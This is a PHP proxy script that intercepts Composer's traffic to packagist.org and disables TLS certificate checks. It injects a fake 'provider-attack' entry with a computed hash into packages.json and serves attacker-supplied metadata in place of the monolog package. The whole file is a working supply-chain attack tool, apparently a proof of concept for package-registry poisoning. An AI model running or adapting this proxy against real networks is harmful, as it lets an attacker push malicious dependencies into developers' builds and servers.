<?php

$url = $_GET['url'];
$method = $_SERVER['REQUEST_METHOD'];
$https = $_SERVER['HTTPS'];

$furl = ( $https == 'on' )  ? "https://" : "http://";
$furl .= "packagist.org$url";

debuglog( "Call ($method):$https to '$furl'" );


if ( $url == '/packages.json' ) {

	$data = getPackagist( $furl, $https );
	$attackfile = file_get_contents( './p-attack.json' );
	$hash = hash( 'sha256', $attackfile );
	$data = str_replace( '}}}', '},"p\/provider-attack$%hash%.json":{"sha256":"'.$hash.'"}}}', $data );
	debuglog( "New packages.json: $data" );

} elseif ( preg_match( '#^/p/provider-attack#', $url ) ) {

	$data = file_get_contents( './p-attack.json' );
	debuglog( "Sending attack provider: $data" );

} elseif ( preg_match( '#^/p/monolog/monolog#', $url ) ) {

	$data = file_get_contents( './monolog.json' );
	debuglog( "Sending attack monolog: $data" );

} else {

	$data = getPackagist( $furl, $https );

}

echo $data;


function getPackagist( $furl, $https ) {
	$ch = curl_init();
	curl_setopt( $ch, CURLOPT_URL, $furl );
	curl_setopt( $ch, CURLOPT_HEADER, 0 );
	curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1 );

	if ( $https == 'on' ) {
		curl_setopt( $ch, CURLOPT_PORT , 443 );
		curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false );
		curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, 0 );
	}

	$data = curl_exec( $ch );

	$info = curl_getinfo( $ch );

	if ( curl_errno( $ch ) ) {
		debuglog( "Curl error: ".curl_error($ch) );
	}

	$hash = hash( 'sha256', $data );

	debuglog( "Response from {$info['url']} ({$info['http_code']}): {$info['content_type']}, $hash" );

	return $data;
}


function debuglog( $msg ) {
	file_put_contents( '/tmp/proxy.log', "$msg\n", FILE_APPEND );
}
